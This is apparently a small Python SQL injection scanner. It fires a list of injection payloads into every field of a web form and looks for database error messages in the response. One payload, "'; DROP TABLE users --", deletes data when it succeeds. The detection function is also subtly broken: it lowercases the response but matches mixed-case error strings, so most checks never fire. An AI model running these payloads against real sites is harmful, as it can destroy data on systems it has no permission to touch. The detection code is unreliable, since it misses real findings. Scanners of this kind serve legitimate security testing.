# sqli_detector.py
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users --"
]
# sqli_detector.py
import requests

class SQLiDetector:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_form(self, form):
        vulnerabilities = []
        for payload in SQLI_PAYLOADS:
            data = {}
            for input_field in form['inputs']:
                data[input_field['name']] = payload  # Inject payload into all fields
            try:
                if form['method'] == 'post':
                    response = requests.post(form['action'], data=data)
                else:
                    response = requests.get(form['action'], params=data)
                
                if self.is_vulnerable(response):
                    vulnerabilities.append({
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method']
                    })
            except Exception as e:
                print(f"[!] Error testing {form['action']}: {e}")
        return vulnerabilities

    def is_vulnerable(self, response):
        errors = [
            "SQL syntax",
            "MySQL server version",
            "Warning: mysqli",
            "unclosed quotation mark"
        ]
        return any(error in response.text.lower() for error in errors)